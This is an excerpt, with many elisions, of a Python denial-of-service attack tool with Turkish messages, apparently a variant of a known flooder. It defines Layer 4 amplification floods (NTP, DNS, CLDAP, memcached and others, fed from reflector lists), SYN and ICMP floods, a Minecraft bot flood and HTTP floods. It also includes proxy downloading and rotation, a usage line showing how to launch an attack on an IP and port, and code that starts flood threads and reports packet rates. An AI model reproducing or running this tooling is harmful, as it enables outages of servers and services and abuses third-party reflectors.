...
class Methods:
    ...
    Layer1_METHODS: Set[str] = {*Layer1_AMP,
                               
                                "MCBOT"
                                }

    ALL_METHODS: Set[str] = {*Layer1_METHODS, *LAYER7_METHODS}
...
class HttpFlood(Thread):
    ...
    def BOMB(self):
        assert self._proxies, \
            'Bu method proxy gerektirir. ' \
            'Proxyler olmadan github.com/codesenberg/bombardier adresini kullanabilirsiniz'
...
class ProxyManager:
    ...
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
        ...
        logger.info(
            f"{bcolors.WARNING}Proxy'leri şuradan indirebilirsiniz {bcolors.OKBLUE}%d{bcolors.WARNING} Sağlayıcılar{bcolors.RESET}" % len(
                providrs))
    ...
    def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
        logger.debug(
            f"{bcolors.WARNING}Proxyler (URL: {bcolors.OKBLUE}%s{bcolors.WARNING}, Tip: {bcolors.OKBLUE}%s{bcolors.WARNING}, Timeout: {bcolors.OKBLUE}%d{bcolors.WARNING}){bcolors.RESET}" %
        ...
        with suppress(TimeoutError, exceptions.ConnectionError,
            ...
            try:
                ...
                logger.error(f'Proxy Hatasını İndirin: {(e.__str__() or e.__repr__())}')
        return proxes
...
class ToolsConsole:
    ...
    def usage():
        print((
                  '* AntiLess - MCBOT Saldırı dosyası %d Method\n'
                  'Note: Proxy listesi boşsa, saldırı proxyler olmadan çalışacaktır\n'
                  '      Proxy dosyası mevcut değilse, komut dosyası proxyleri indirecek ve kontrol edecektir.\n'
                  '      Proxy Türü 0 = Tümü config.json da\n'
                  '      Socks Tipleri:\n'
                  '         - 6 = RANDOM\n'
                  '         - 5 = SOCKS5\n'
                  '         - 4 = SOCKS4\n'
                  ...
                  'Örnek:\n'
                  '   %s'
                  '   MCBOT: python3 %s MCBOT <IP-PORT> <Threads> <Süre> config.json 100 600\n'
                  '   %s'
                  '   %s'
                  ' \n') %
              (len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
               ", ".join(Methods.Layer1_METHODS), len(Methods.Layer1_METHODS),
...
def handleProxyList(con, proxy_li, proxy_ty, url=None):
    ...
    if not proxy_li.exists():
        logger.warning(
            f"{bcolors.WARNING}Dosya mevcut değil, dosya oluşturma ve proxy indirme.{bcolors.RESET}")
        proxy_li.parent.mkdir(parents=True, exist_ok=True)
        with proxy_li.open("w") as wr:
            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
            logger.info(
                f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxy'ler kontrol ediliyor, bu biraz zaman alabilir{bcolors.RESET}!"
            )
    ...
    if proxies:
        logger.info(f"{bcolors.WARNING}Proxy Sayısı: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
    else:
        logger.info(
            f"{bcolors.WARNING}Boş Proxy Dosyası, proxy olmadan flood çalıştırma{bcolors.RESET}")
        proxies = None
...
if __name__ == '__main__':
    with suppress(KeyboardInterrupt):
        with suppress(IndexError):
            ...
            if method in Methods.LAYER7_METHODS:
                ...
                if method != "TOR":
                    try:
                        ...
                        exit('Ana bilgisayar adı çözülemiyor ', url.host, str(e))
                ...
                if not referers: exit("Boş Referans Dosyası ")

                if threads > 1000:
                    logger.warning("Thread 1000'den yüksek")
                if rpc > 100:
                    logger.warning(
                        "RPC (Bağlantı Öncesi İstek) 100'den yüksek")
            ...
            if method in Methods.Layer1_METHODS:
                target = URL(urlraw)
                ...
                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN", "ICMP"} and \
                    ...
                    exit("Raw Soket Oluşturulamıyor")

                if method in Methods.Layer1_AMP:
                    logger.warning("bu yöntem sahte sunuculara ihtiyaç duyar lütfen kontrol edin")
                ...
                if not port:
                    logger.warning("Bağlantı Noktası Seçilmedi, Varsayılan Olarak Ayarlandı: 80")
                    port = 80
                    ...
                    if argfive:
                        ...
                        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
                            if not refl_li.exists():
                                exit("Reflector dosyası mevcut değil")
                            if len(argv) == 7:
                                logger.setLevel("DEBUG")
                            ref = set(a.strip()
                                      for a in Tools.IP.findall(refl_li.open("r").read()))
                            if not ref: exit("Boş reflector dosyası ")
                            ...
                            if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
                                exit("bu yöntem Layer1 proxy için kullanılamaz")
                ...
                for _ in range(threads):
                    Layer1((target, port), ref, method, event,
                           proxies, protocolid).start()

            logger.info(
                f"{bcolors.FAIL}Saldırı Başladı | {bcolors.WARNING}Site: {bcolors.OKBLUE}%s | {bcolors.WARNING} Method:{bcolors.OKBLUE} %s | {bcolors.WARNING} Saniye:{bcolors.OKBLUE} %s | {bcolors.WARNING} Threads:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}"
                % (target or url.host, method, timer, threads))
            event.set()
            ts = time()
            while time() < ts + timer:
                logger.debug(
                    f'{bcolors.WARNING}Hedef:{bcolors.OKBLUE} %s,{bcolors.WARNING} Port:{bcolors.OKBLUE} %s,{bcolors.WARNING} Method:{bcolors.OKBLUE} %s{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%{bcolors.RESET}' %
                    (target or url.host,
